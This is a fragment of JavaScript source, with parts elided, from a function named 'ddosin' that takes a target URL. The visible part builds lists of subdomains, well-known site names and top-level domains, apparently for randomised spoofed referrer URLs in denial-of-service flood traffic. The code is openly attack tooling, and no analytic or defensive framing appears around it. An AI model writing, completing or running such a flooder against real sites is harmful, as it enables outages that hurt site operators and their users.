...
function ddosin(targetUrl) {
  ...
  const subdomains = [
    "www.", "search.", "play.", "drive.", "jobs.", "add.", "profile.", "careers.", 
    "taginfo.", "engadget.", "developers.", "api.", "my.", "dashboard.", "", "mail.", 
    "news.", "shop.", "store.", "blog.", "support."
  ];
  const domainNames = [
    "google", "yahoo", "bing", "facebook", "baidu", "yandex", "usatoday", "duckduckgo", 
    "ask", "vk", "reddit", "npmjs", "pinterest", generateRandomName(),
    "amazon", "youtube", "linkedin", "twitter", "instagram", "netflix", "tiktok", "microsoft",
    "apple", "adobe", "github"
  ];
  const tlds = [
    "com", "xyz", "net", "biz", "info", "org", "edu", "pro", "travel", "coop", "tv", "tor", "io", 
    "asia", "co", "us", "me", "tech", "site", "online"
  ];
